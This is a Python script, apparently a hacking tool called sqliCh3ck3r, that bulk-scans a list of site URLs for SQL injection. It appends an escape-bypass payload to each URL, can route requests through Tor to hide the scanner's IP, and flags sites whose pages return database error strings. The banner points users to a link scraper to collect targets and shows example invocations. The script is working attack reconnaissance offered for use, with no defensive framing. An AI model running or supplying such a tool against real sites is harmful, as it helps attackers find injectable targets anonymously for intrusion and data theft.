#-*- coding: utf-8 -*-
import requests, sys, os
import socket
import socks
def cleanme():
    cleeee='clear'
    os.system(cleeee)
def banner2():
    cleanme()
    print(("""\x1b[30;38;5;145m[\x1b[1;38;5;222m Title \x1b[0m\x1b[30;38;5;145m]\x1b[0m\x1b[1;38;5;111m Check if site has sql injection errors.. \x1b[0m
                \x1b[0;33m\x1b[0m\x1b[1;32m\x1b[30;38;5;59mــــــ\x1b[1;37m❖\x1b[0mــــــ\x1b[0m

         █  █       █           █
 ███     █      ███ █   ███     █   ███
 █   ███ █  █   █   ███   █ ███ █ █   █ ███
  █  █ █ █  █   █   █ █ ███ █   ██  ███ █
   █ █ █ █  █   █   █ █   █ █   ██    █ █
 ███ ███ ██ █   ███ █ █ ███ ███ █ █ ███ █
       █
       █
       
[\x1b[1;38;5;156m + \x1b[0m] Tor is %s
\x1b[1;38;5;108mStarting...\x1b[0m

"""%(setHdr)))
def file_open(file_name):
    list = []
    file = open(file_name,"r")
    file_in = file.readlines()
    for value in file_in:
        if value not in " ":
            list.append(value.replace("\n", ""))
        else:
            pass
    file.close()
    return list
def checker(vuln_list):
    error_list = file_open("error.txt")
    sites = []
    value = False
    for vuln in vuln_list:
        sites.append(vuln+"1%bf%5c%27")
    for site in sites:
        try:
            request = requests.get(url=site.encode("UTF-8"))
            source_code = str(request.content)
            for error in error_list:
                if error in source_code:
                    value = True
                    break
                elif error not in source_code:
                    value = False
                    continue
            if value == True:
                print("\x1b[1;38;5;189m[ \x1b[1;38;5;119m+\x1b[1;38;5;189m ]\x1b[0m SQL injection Detection => \x1b[1;38;5;118m%s\x1b[0m"%(site))
            elif value == False:
                print("\x1b[1;38;5;189m[ \x1b[1;38;5;244m-\x1b[1;38;5;189m ]\x1b[0m ... \x1b[1;38;5;235m%s\x1b[0m"%(site))
        except requests.ConnectionError:
            print("\x1b[1;38;5;189m[ \x1b[30;38;5;160m!\x1b[1;38;5;189m ]\x1b[0m Connection bloced your ip \x1b[1;38;5;235m%s\x1b[0m"%(site))
    print("{}".format("=" * 75))

def banner():
    cleanme()
    print(("""\x1b[30;38;5;145m[\x1b[1;38;5;222m Title \x1b[0m\x1b[30;38;5;145m]\x1b[0m\x1b[1;38;5;111m Check if site has sql injection errors.. \x1b[0m
                \x1b[0;33m\x1b[0m\x1b[1;32m\x1b[30;38;5;59mــــــ\x1b[1;37m❖\x1b[0mــــــ\x1b[0m

         █  █       █           █
 ███     █      ███ █   ███     █   ███
 █   ███ █  █   █   ███   █ ███ █ █   █ ███
  █  █ █ █  █   █   █ █ ███ █   ██  ███ █
   █ █ █ █  █   █   █ █   █ █   ██    █ █
 ███ ███ ██ █   ███ █ █ ███ ███ █ █ ███ █
       █
       █

[!] \x1b[1;38;5;189mfor example urls in site.txt :\x1b[0m
\x1b[1;38;5;250m    http://site.com/in/file.php?id=123
    https://site.com/in/file.aspx?uid=123
    http://site.com/in/file/uid/123?=123\x1b[0m
#use https://github.com/OGcyb3r/GetHref to get links from specific site.. Mind your business

\x1b[1;38;5;155m-t\x1b[0m\x1b[1;38;5;255m scan with tor connection\x1b[0m\x1b[1;38;5;255m
\x1b[1;38;5;155m-x\x1b[0m\x1b[1;38;5;255m scan without tor connection\x1b[0m

\x1b[30;38;5;189m python3 sqliCh3ck3r.py\x1b[1;38;5;117m site.txt \x1b[0m\x1b[1;38;5;155m-t\x1b[0m
\x1b[30;38;5;189m python3 sqliCh3ck3r.py\x1b[1;38;5;117m site.txt \x1b[0m\x1b[1;38;5;152m-x\x1b[0m

"""))



if __name__ == "__main__":
    try:

        if sys.argv[2] == '-t':
        	setHdr="On"
        	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050,True)
        	socket.socket = socks.socksocket
        elif sys.argv[2] == '-x':
            setHdr="Off"
        banner2()
        target_file = file_open(sys.argv[1])
        checker(target_file)
        sys.exit()
    except IndexError:
        banner()
        sys.exit()
    except KeyboardInterrupt:
        sys.exit()
